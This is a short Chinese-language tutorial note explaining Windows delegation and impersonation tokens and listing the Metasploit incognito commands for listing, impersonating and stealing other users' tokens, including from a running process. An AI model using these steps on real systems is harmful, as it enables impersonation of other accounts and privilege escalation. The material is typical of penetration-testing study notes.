Windows Token类型

Delegation token ( 授权令牌 ) :
用于交互会话登录 ( 例如本地用户直接登录、远程桌面登录 )

Impersonation token ( 模拟令牌 ) :
用于非交互登录 ( 利用 net use 访问共享文件夹 )

注：两种 token 只在系统重启后清除， 具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation token，依旧有效。

Token窃取工具

下载链接：incognito

MSF使用incognito

查看当Token： getuid

加载incognito：load incognito

列举全部token：list_tokens -u

Token窃取: impersonate_token “WIN-L6B129PFE38\aaa”

返回之前token：rev2self or drop_token

另外该工具还可以从进程中窃取token：steal_token 2144

总结

通过对Windows令牌窃取，可以进行用户会话升权降权的操作。可以利用其他的用户身份去进行相应的操作。
